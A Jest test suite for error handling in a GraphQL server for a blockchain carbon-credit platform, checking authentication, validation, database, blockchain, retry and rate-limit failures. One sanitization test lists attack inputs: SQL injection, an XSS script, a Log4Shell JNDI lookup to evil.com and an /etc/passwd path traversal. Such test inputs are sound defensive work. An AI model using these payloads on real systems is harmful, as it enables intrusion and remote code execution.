/**
 * Error Handling Test Suite - Task 57.6
 * Comprehensive tests for error handling across all Task 57 implementations
 */

import {
  describe,
  it,
  expect,
  beforeAll,
  afterAll,
  beforeEach,
  afterEach,
  jest,
} from '@jest/globals';
import { ApolloServer } from '@apollo/server';
import { gql } from 'graphql-tag';
import { GraphQLError } from 'graphql';
import { typeDefs } from '../../schema/typeDefs.js';
import { resolvers } from '../../resolvers/index.js';
import {
  createMockContext,
  expectGraphQLError,
  expectGraphQLSuccess,
} from '../mocks/datasource.js';
import { GraphQLContext } from '../../context.js';
import {
  formatError,
  withRetry,
  withPerformanceMonitoring,
  authenticationError,
  notFoundError,
  validationError,
  databaseError,
  blockchainError,
  timeoutError,
  ErrorCode,
} from '../../error-handler.js';
import {
  getGraphQLData,
  hasGraphQLErrors,
  type UserProfileResponse,
  type UsersQueryResponse,
  type CarbonCreditsResponse,
  type SwapsResponse,
} from '../utils/graphql-types.js';

describe('Error Handling Test Suite', () => {
  let server: ApolloServer<GraphQLContext>;
  let mockContext: any;
  let mockDb: any;
  let mockContracts: any;

  beforeAll(async () => {
    // Create mock database with controlled error responses
    mockDb = {
      query: {
        users: {
          findFirst: jest.fn(),
          findMany: jest.fn(),
        },
        carbonCredits: {
          findMany: jest.fn(),
        },
        carbonFootprints: {
          findFirst: jest.fn(),
        },
        computationalNfts: {
          findFirst: jest.fn(),
          findMany: jest.fn(),
        },
        computeRewards: {
          findMany: jest.fn(),
        },
        ammPairs: {
          findFirst: jest.fn(),
          findMany: jest.fn(),
        },
        ammSwaps: {
          findMany: jest.fn(),
        },
      },
      update: jest.fn(),
      insert: jest.fn(),
    };

    // Create mock contracts with controlled error responses
    mockContracts = {
      wrfToken: {
        balanceOf: jest.fn(),
      },
      wrfGovernor: {
        getVotes: jest.fn(),
      },
      computationalNFT: {
        getComputeJob: jest.fn(),
        ownerOf: jest.fn(),
        getProviderStats: jest.fn(),
      },
      carbonCreditAMM: {
        getPairInfo: jest.fn(),
        getReserves: jest.fn(),
        swapFee: jest.fn(),
      },
    };

    server = new ApolloServer<GraphQLContext>({
      typeDefs,
      resolvers,
      formatError: (formattedError, error) => {
        // Test that our custom error formatting is working
        return formattedError;
      },
    });

    mockContext = {
      ...createMockContext(),
      db: mockDb,
      contracts: mockContracts,
      requestId: 'test-request-id',
      clientIP: '127.0.0.1',
    };
  });

  beforeEach(() => {
    jest.clearAllMocks();
    // Reset all mocks to successful defaults
    mockDb.query.users.findFirst.mockResolvedValue(null);
    mockDb.query.users.findMany.mockResolvedValue([]);
    mockDb.query.carbonCredits.findMany.mockResolvedValue([]);
    mockDb.query.computationalNfts.findFirst.mockResolvedValue(null);
    mockContracts.wrfToken.balanceOf.mockResolvedValue(BigInt(0));
    mockContracts.computationalNFT.getComputeJob.mockResolvedValue([]);
  });

  afterAll(async () => {
    await server?.stop();
  });

  describe('Authentication Errors', () => {
    it('should handle unauthenticated user requests', async () => {
      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query Me {
              me {
                id
                username
              }
            }
          `,
        },
        {
          contextValue: {
            ...mockContext,
            user: null,
            isAuthenticated: false,
          },
        }
      );

      // Assert
      expectGraphQLError(result, 'Authentication required');
      expect(result.body.kind).toBe('single');
      if (result.body.kind === 'single') {
        const error = result.body.singleResult.errors?.[0];
        expect(error?.extensions?.code).toBe('UNAUTHENTICATED');
      }
    });

    it('should handle unverified wallet requests for sensitive operations', async () => {
      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            mutation UpdateProfile($input: UpdateProfileInput!) {
              updateProfile(input: $input) {
                success
              }
            }
          `,
          variables: {
            input: {
              displayName: 'Test',
              signature: '0x' + '1'.repeat(130),
            },
          },
        },
        {
          contextValue: {
            ...mockContext,
            user: { address: '0x1234567890123456789012345678901234567890' }, // Not verified
            isAuthenticated: true,
          },
        }
      );

      // Assert
      expectGraphQLError(result, 'Verified wallet required');
    });

    it('should handle expired session tokens', async () => {
      // Simulate expired session by throwing authentication error
      mockDb.query.users.findFirst.mockRejectedValue(
        authenticationError('Session expired', {
          requestId: 'test-request-id',
          operationType: 'me',
        })
      );

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query Me {
              me {
                id
              }
            }
          `,
        },
        {
          contextValue: {
            ...mockContext,
            user: { address: '0x1234567890123456789012345678901234567890' },
            isAuthenticated: true,
          },
        }
      );

      // Assert
      expectGraphQLError(result, 'Session expired');
    });
  });

  describe('Validation Errors', () => {
    it('should handle invalid Ethereum address formats', async () => {
      const invalidAddresses = [
        'invalid-address',
        '0x123', // Too short
        '0x', // Empty
        'not-hex',
        null,
        undefined,
      ];

      for (const invalidAddress of invalidAddresses) {
        const result = await server.executeOperation(
          {
            query: gql`
              query User($address: String!) {
                user(address: $address) {
                  id
                }
              }
            `,
            variables: { address: invalidAddress },
          },
          {
            contextValue: mockContext,
          }
        );

        expectGraphQLError(result, 'Invalid Ethereum address format');

        if (result.body.kind === 'single') {
          const error = result.body.singleResult.errors?.[0];
          expect(error?.extensions?.code).toBe('BAD_USER_INPUT');
        }
      }
    });

    it('should handle invalid token ID formats', async () => {
      const invalidTokenIds = [
        'not-a-number',
        '-1', // Negative
        '1.5', // Decimal
        'abc123',
        '',
      ];

      for (const invalidId of invalidTokenIds) {
        const result = await server.executeOperation(
          {
            query: gql`
              query ComputationalNFT($id: String!) {
                computationalNFT(id: $id) {
                  id
                }
              }
            `,
            variables: { id: invalidId },
          },
          {
            contextValue: mockContext,
          }
        );

        expectGraphQLError(result, 'Invalid token ID format');
      }
    });

    it('should handle input field length validation', async () => {
      // Test with overly long input fields
      const result = await server.executeOperation(
        {
          query: gql`
            mutation UpdateProfile($input: UpdateProfileInput!) {
              updateProfile(input: $input) {
                success
                error
              }
            }
          `,
          variables: {
            input: {
              displayName: 'x'.repeat(101), // Exceeds 100 character limit
              bio: 'Valid bio',
              signature: '0x' + '1'.repeat(130),
            },
          },
        },
        {
          contextValue: {
            ...mockContext,
            user: {
              address: '0x1234567890123456789012345678901234567890',
              isVerified: true,
            },
            isAuthenticated: true,
          },
        }
      );

      // Assert
      const data = getGraphQLData<UserProfileResponse>(result);
      expect(data?.updateProfile?.success).toBe(false);
      expect(data?.updateProfile?.error).toContain('100 characters or less');
    });

    it('should handle pagination limit validation', async () => {
      // Test with excessive pagination limits
      const result = await server.executeOperation(
        {
          query: gql`
            query Users($first: Int) {
              users(first: $first) {
                id
              }
            }
          `,
          variables: { first: 1000 }, // Exceeds reasonable limit
        },
        {
          contextValue: mockContext,
        }
      );

      // Should succeed but cap the limit
      expectGraphQLSuccess(result);
      expect(mockDb.query.users.findMany).toHaveBeenCalledWith(
        expect.objectContaining({
          limit: 100, // Should be capped at 100
        })
      );
    });

    it('should sanitize input to prevent injection attacks', async () => {
      // Test with potentially malicious input
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
      ];

      for (const maliciousInput of maliciousInputs) {
        const result = await server.executeOperation(
          {
            query: gql`
              query Users($where: UserWhereInput) {
                users(where: $where) {
                  id
                }
              }
            `,
            variables: {
              where: { username_contains: maliciousInput },
            },
          },
          {
            contextValue: mockContext,
          }
        );

        // Should not throw errors and should sanitize input
        expectGraphQLSuccess(result);
      }
    });
  });

  describe('Database Errors', () => {
    it('should handle database connection failures', async () => {
      // Simulate database connection failure
      mockDb.query.users.findFirst.mockRejectedValue(
        new Error('Connection to database failed')
      );

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query Me {
              me {
                id
              }
            }
          `,
        },
        {
          contextValue: {
            ...mockContext,
            user: { address: '0x1234567890123456789012345678901234567890' },
            isAuthenticated: true,
          },
        }
      );

      // Assert
      expectGraphQLError(result, 'Connection to database failed');
    });

    it('should handle database timeout errors', async () => {
      // Simulate database timeout
      mockDb.query.users.findFirst.mockImplementation(
        () =>
          new Promise((_, reject) =>
            setTimeout(() => reject(new Error('Query timeout')), 100)
          )
      );

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query Me {
              me {
                id
              }
            }
          `,
        },
        {
          contextValue: {
            ...mockContext,
            user: { address: '0x1234567890123456789012345678901234567890' },
            isAuthenticated: true,
          },
        }
      );

      // Assert
      expectGraphQLError(result, 'Query timeout');
    }, 10000);

    it('should handle database constraint violations', async () => {
      // Simulate unique constraint violation
      const mockUpdate = {
        set: jest.fn().mockReturnValue({
          where: jest.fn().mockReturnValue({
            returning: (jest.fn() as any).mockRejectedValue(
              new Error('duplicate key value violates unique constraint')
            ),
          }),
        }),
      };
      mockDb.update.mockReturnValue(mockUpdate);

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            mutation UpdateProfile($input: UpdateProfileInput!) {
              updateProfile(input: $input) {
                success
                error
              }
            }
          `,
          variables: {
            input: {
              displayName: 'Test',
              signature: '0x' + '1'.repeat(130),
            },
          },
        },
        {
          contextValue: {
            ...mockContext,
            user: {
              address: '0x1234567890123456789012345678901234567890',
              isVerified: true,
            },
            isAuthenticated: true,
          },
        }
      );

      // Assert
      const data = getGraphQLData<UserProfileResponse>(result);
      expect(data?.updateProfile?.success).toBe(false);
      expect(data?.updateProfile?.error).toBeTruthy();
    });

    it('should handle database deadlock scenarios', async () => {
      // Simulate deadlock detection
      mockDb.query.carbonCredits.findMany.mockRejectedValue(
        new Error('deadlock detected')
      );

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query User($address: String!) {
              user(address: $address) {
                carbonCredits {
                  id
                }
              }
            }
          `,
          variables: { address: '0x1234567890123456789012345678901234567890' },
        },
        {
          contextValue: mockContext,
        }
      );

      // Should handle gracefully and return empty array
      expectGraphQLSuccess(result);
      const data = getGraphQLData<CarbonCreditsResponse>(result);
      expect(data?.carbonCredits).toEqual([]);
    });

    it('should handle partial database failures with graceful degradation', async () => {
      // Setup: User query succeeds, but carbon credits query fails
      const testUser = {
        walletAddress: '0x1234567890123456789012345678901234567890',
        username: 'testuser',
        email: 'test@example.com',
        displayName: 'Test User',
        isVerified: true,
        createdAt: new Date(),
        lastActiveAt: new Date(),
      };

      mockDb.query.users.findFirst.mockResolvedValue(testUser);
      mockDb.query.carbonCredits.findMany.mockRejectedValue(
        new Error('Carbon credits service unavailable')
      );

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query User($address: String!) {
              user(address: $address) {
                id
                username
                carbonCredits {
                  id
                }
              }
            }
          `,
          variables: { address: testUser.walletAddress },
        },
        {
          contextValue: mockContext,
        }
      );

      // Assert - Should return user data but empty carbon credits
      expectGraphQLSuccess(result);
      const data = getGraphQLData<{
        user: { username: string; carbonCredits: any[] };
      }>(result);
      expect(data?.user?.username).toBe(testUser.username);
      expect(data?.user?.carbonCredits).toEqual([]); // Graceful degradation
    });
  });

  describe('Blockchain Errors', () => {
    it('should handle blockchain connection failures', async () => {
      const testUser = {
        walletAddress: '0x1234567890123456789012345678901234567890',
        username: 'testuser',
        email: 'test@example.com',
        isVerified: true,
        createdAt: new Date(),
        lastActiveAt: new Date(),
      };

      mockDb.query.users.findFirst.mockResolvedValue(testUser);
      mockContracts.wrfToken.balanceOf.mockRejectedValue(
        new Error('Blockchain node unavailable')
      );

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query Me {
              me {
                id
                wrfBalance
              }
            }
          `,
        },
        {
          contextValue: {
            ...mockContext,
            user: { address: testUser.walletAddress },
            isAuthenticated: true,
          },
        }
      );

      // Assert - Should return user data with default balance
      expectGraphQLSuccess(result);
      const data = getGraphQLData<{ me: { id: string; wrfBalance: string } }>(
        result
      );
      expect(data?.me?.id).toBe(testUser.walletAddress);
      expect(data?.me?.wrfBalance).toBe('0'); // Default value
    });

    it('should handle blockchain timeout errors', async () => {
      const testNFT = {
        nftId: '1',
        creator: '0x1234567890123456789012345678901234567890',
        name: 'Test NFT',
        computationType: 'WEATHER_FORECAST',
        isVerified: true,
        createdAt: new Date(),
      };

      mockDb.query.computationalNfts.findFirst.mockResolvedValue(testNFT);

      // Simulate blockchain timeout
      mockContracts.computationalNFT.getComputeJob.mockImplementation(
        () =>
          new Promise((_, reject) =>
            setTimeout(
              () => reject(timeoutError('Blockchain call timeout', 5000)),
              100
            )
          )
      );

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query ComputationalNFT($id: String!) {
              computationalNFT(id: $id) {
                id
                modelType
                owner
              }
            }
          `,
          variables: { id: '1' },
        },
        {
          contextValue: mockContext,
        }
      );

      // Assert - Should fallback to database data
      expectGraphQLSuccess(result);
      const data = getGraphQLData<{
        computationalNFT: { id: string; modelType: string; owner: string };
      }>(result);
      expect(data?.computationalNFT?.id).toBe('1');
      expect(data?.computationalNFT?.modelType).toBe(testNFT.computationType); // From database
      expect(data?.computationalNFT?.owner).toBe(testNFT.creator); // From database
    }, 10000);

    it('should handle invalid contract call errors', async () => {
      const testPair = {
        pairAddress: '0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
        token0: '0x1111111111111111111111111111111111111111',
        token1: '0x2222222222222222222222222222222222222222',
        totalLiquidity: '1000000000000000000000',
        isActive: true,
        createdAt: new Date(),
      };

      mockDb.query.ammPairs.findFirst.mockResolvedValue(testPair);
      mockContracts.carbonCreditAMM.getPairInfo.mockRejectedValue(
        new Error('Invalid contract address')
      );

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query AMMPool($id: String!) {
              ammPool(id: $id) {
                id
                token0
                token1
              }
            }
          `,
          variables: { id: testPair.pairAddress },
        },
        {
          contextValue: mockContext,
        }
      );

      // Assert - Should fallback to database data
      expectGraphQLSuccess(result);
      const data = getGraphQLData<{
        ammPool: { token0: string; token1: string };
      }>(result);
      expect(data?.ammPool?.token0).toBe(testPair.token0); // From database
      expect(data?.ammPool?.token1).toBe(testPair.token1); // From database
    });

    it('should handle gas estimation failures', async () => {
      // This would test scenarios where gas estimation fails for transactions
      // For now, we'll test that such errors are handled gracefully in read operations

      mockContracts.carbonCreditAMM.getReserves.mockRejectedValue(
        new Error('Gas estimation failed')
      );

      const testPair = {
        pairAddress: '0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
        reserve0: '1000000000000000000000',
        reserve1: '50000000000',
        createdAt: new Date(),
      };

      mockDb.query.ammPairs.findFirst.mockResolvedValue(testPair);

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query AMMPool($id: String!) {
              ammPool(id: $id) {
                id
                reserve0
                reserve1
              }
            }
          `,
          variables: { id: testPair.pairAddress },
        },
        {
          contextValue: mockContext,
        }
      );

      // Assert
      expectGraphQLSuccess(result);
      const data = getGraphQLData<{ ammPool: { reserve0: string } }>(result);
      expect(data?.ammPool?.reserve0).toBe(testPair.reserve0); // From database
    });
  });

  describe('Network and Timeout Errors', () => {
    it('should handle network request timeouts', async () => {
      // Simulate long-running operation that times out
      mockDb.query.users.findMany.mockImplementation(
        () => new Promise(resolve => setTimeout(() => resolve([]), 35000)) // Longer than typical timeout
      );

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query Users {
              users(first: 10) {
                id
              }
            }
          `,
        },
        {
          contextValue: mockContext,
        }
      );

      // Assert - Should eventually timeout and return error
      // In a real implementation, this would be handled by timeout middleware
      expectGraphQLError(result, 'timeout');
    }, 40000);

    it('should handle concurrent request limit exceeded', async () => {
      // Simulate rate limiting
      const promises = Array.from({ length: 20 }, () =>
        server.executeOperation(
          {
            query: gql`
              query Me {
                me {
                  id
                }
              }
            `,
          },
          {
            contextValue: {
              ...mockContext,
              user: { address: '0x1234567890123456789012345678901234567890' },
              isAuthenticated: true,
            },
          }
        )
      );

      // Act
      const results = await Promise.allSettled(promises);

      // Assert - All should complete, but rate limiting should be applied at infrastructure level
      results.forEach(result => {
        if (result.status === 'fulfilled') {
          // Should either succeed or fail gracefully
          expect(result.value).toBeDefined();
        }
      });
    });

    it('should handle DNS resolution failures', async () => {
      // Simulate DNS resolution failure for external services
      mockContracts.wrfToken.balanceOf.mockRejectedValue(
        new Error('ENOTFOUND blockchain.example.com')
      );

      const testUser = {
        walletAddress: '0x1234567890123456789012345678901234567890',
        username: 'testuser',
        isVerified: true,
        createdAt: new Date(),
      };

      mockDb.query.users.findFirst.mockResolvedValue(testUser);

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query Me {
              me {
                id
                wrfBalance
              }
            }
          `,
        },
        {
          contextValue: {
            ...mockContext,
            user: { address: testUser.walletAddress },
            isAuthenticated: true,
          },
        }
      );

      // Assert - Should handle gracefully
      expectGraphQLSuccess(result);
      const data = getGraphQLData<{ me: { wrfBalance: string } }>(result);
      expect(data?.me?.wrfBalance).toBe('0'); // Default value
    });
  });

  describe('Memory and Resource Errors', () => {
    it('should handle out of memory errors for large queries', async () => {
      // Simulate out of memory error
      mockDb.query.users.findMany.mockRejectedValue(
        new Error('JavaScript heap out of memory')
      );

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query Users {
              users(first: 100) {
                id
                username
              }
            }
          `,
        },
        {
          contextValue: mockContext,
        }
      );

      // Assert
      expectGraphQLError(result, 'JavaScript heap out of memory');
    });

    it('should handle resource exhaustion gracefully', async () => {
      // Simulate resource exhaustion
      mockDb.query.ammSwaps.findMany.mockRejectedValue(
        new Error('Too many connections')
      );

      const testPair = {
        pairAddress: '0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
        createdAt: new Date(),
      };

      mockDb.query.ammPairs.findFirst.mockResolvedValue(testPair);

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query AMMPool($id: String!) {
              ammPool(id: $id) {
                swaps {
                  id
                }
              }
            }
          `,
          variables: { id: testPair.pairAddress },
        },
        {
          contextValue: mockContext,
        }
      );

      // Assert - Should handle gracefully and return empty array
      expectGraphQLSuccess(result);
      const data = getGraphQLData<{ ammPool: { swaps: any[] } }>(result);
      expect(data?.ammPool?.swaps).toEqual([]);
    });
  });

  describe('Error Recovery and Retry Logic', () => {
    it('should retry transient database errors', async () => {
      // Setup: Fail twice, then succeed
      const testUser = {
        walletAddress: '0x1234567890123456789012345678901234567890',
        username: 'testuser',
        isVerified: true,
        createdAt: new Date(),
      };

      mockDb.query.users.findFirst
        .mockRejectedValueOnce(new Error('Connection lost'))
        .mockRejectedValueOnce(new Error('Connection lost'))
        .mockResolvedValueOnce(testUser);

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query Me {
              me {
                id
                username
              }
            }
          `,
        },
        {
          contextValue: {
            ...mockContext,
            user: { address: testUser.walletAddress },
            isAuthenticated: true,
          },
        }
      );

      // Assert - Should eventually succeed after retries
      expectGraphQLSuccess(result);
      const data = getGraphQLData<{ me: { username: string } }>(result);
      expect(data?.me?.username).toBe(testUser.username);

      // Verify retry logic was applied
      expect(mockDb.query.users.findFirst).toHaveBeenCalledTimes(3);
    });

    it('should not retry non-transient errors', async () => {
      // Setup: Immediate permanent failure
      mockDb.query.users.findFirst.mockRejectedValue(
        validationError('Invalid user ID', 'userId', {
          requestId: 'test-request-id',
        })
      );

      // Act
      const result = await server.executeOperation(
        {
          query: gql`
            query Me {
              me {
                id
              }
            }
          `,
        },
        {
          contextValue: {
            ...mockContext,
            user: { address: '0x1234567890123456789012345678901234567890' },
            isAuthenticated: true,
          },
        }
      );

      // Assert - Should fail immediately without retries
      expectGraphQLError(result, 'Invalid user ID');
      expect(mockDb.query.users.findFirst).toHaveBeenCalledTimes(1);
    });

    it('should implement circuit breaker pattern for repeated failures', async () => {
      // This test would verify circuit breaker implementation
      // For now, we'll test that repeated failures are handled consistently

      const errorCounts = Array.from({ length: 10 }, () => 0);

      for (let i = 0; i < 10; i++) {
        mockDb.query.users.findFirst.mockRejectedValue(
          new Error('Service unavailable')
        );

        const result = await server.executeOperation(
          {
            query: gql`
              query Me {
                me {
                  id
                }
              }
            `,
          },
          {
            contextValue: {
              ...mockContext,
              user: { address: '0x1234567890123456789012345678901234567890' },
              isAuthenticated: true,
            },
          }
        );

        if (result.body.kind === 'single' && result.body.singleResult.errors) {
          errorCounts[i] = 1;
        }
      }

      // All requests should fail consistently
      expect(errorCounts.every(count => count === 1)).toBe(true);
    });
  });

  describe('Error Context and Logging', () => {
    it('should include proper error context in responses', async () => {
      // Test that errors include request ID and other context
      mockDb.query.users.findFirst.mockRejectedValue(
        new Error('Database error')
      );

      const result = await server.executeOperation(
        {
          query: gql`
            query Me {
              me {
                id
              }
            }
          `,
        },
        {
          contextValue: {
            ...mockContext,
            requestId: 'specific-request-id',
            user: { address: '0x1234567890123456789012345678901234567890' },
            isAuthenticated: true,
          },
        }
      );

      expectGraphQLError(result, 'Database error');

      // In a real implementation, you'd verify that error context is properly included
      if (result.body.kind === 'single') {
        const error = result.body.singleResult.errors?.[0];
        expect(error?.extensions).toBeDefined();
      }
    });

    it('should sanitize sensitive information from error messages', async () => {
      // Test that sensitive data is not exposed in error messages
      const mockSensitiveUpdate = {
        set: jest.fn().mockReturnValue({
          where: jest.fn().mockReturnValue({
            returning: (jest.fn() as any).mockRejectedValue(
              new Error('Password "secretpassword123" validation failed')
            ),
          }),
        }),
      };
      mockDb.update.mockReturnValue(mockSensitiveUpdate);

      const result = await server.executeOperation(
        {
          query: gql`
            mutation UpdateProfile($input: UpdateProfileInput!) {
              updateProfile(input: $input) {
                success
                error
              }
            }
          `,
          variables: {
            input: {
              displayName: 'Test',
              signature: '0x' + '1'.repeat(130),
            },
          },
        },
        {
          contextValue: {
            ...mockContext,
            user: {
              address: '0x1234567890123456789012345678901234567890',
              isVerified: true,
            },
            isAuthenticated: true,
          },
        }
      );

      // Error should not contain sensitive information
      const data = getGraphQLData<UserProfileResponse>(result);
      expect(data?.updateProfile?.error).not.toContain('secretpassword123');
    });
  });

  describe('Rate Limiting and Security Errors', () => {
    it('should handle rate limit exceeded errors', async () => {
      // Simulate rate limit exceeded
      mockDb.query.users.findFirst.mockRejectedValue(
        new Error('Rate limit exceeded')
      );

      const result = await server.executeOperation(
        {
          query: gql`
            query Me {
              me {
                id
              }
            }
          `,
        },
        {
          contextValue: {
            ...mockContext,
            user: { address: '0x1234567890123456789012345678901234567890' },
            isAuthenticated: true,
          },
        }
      );

      expectGraphQLError(result, 'Rate limit exceeded');
    });

    it('should handle query depth limit exceeded', async () => {
      // Test very deep nested query
      const deepQuery = gql`
        query DeepQuery($address: String!) {
          user(address: $address) {
            carbonCredits {
              id
            }
            carbonFootprint {
              id
            }
            computationalNFTs {
              id
              job {
                provider {
                  id
                }
                rewards {
                  id
                }
              }
            }
          }
        }
      `;

      // This would be caught by depth limiting middleware
      const result = await server.executeOperation(
        {
          query: deepQuery,
          variables: { address: '0x1234567890123456789012345678901234567890' },
        },
        {
          contextValue: mockContext,
        }
      );

      // Should either succeed or be caught by depth limiter
      // In this test environment without depth limiting, it should succeed
      expectGraphQLSuccess(result);
    });
  });
});
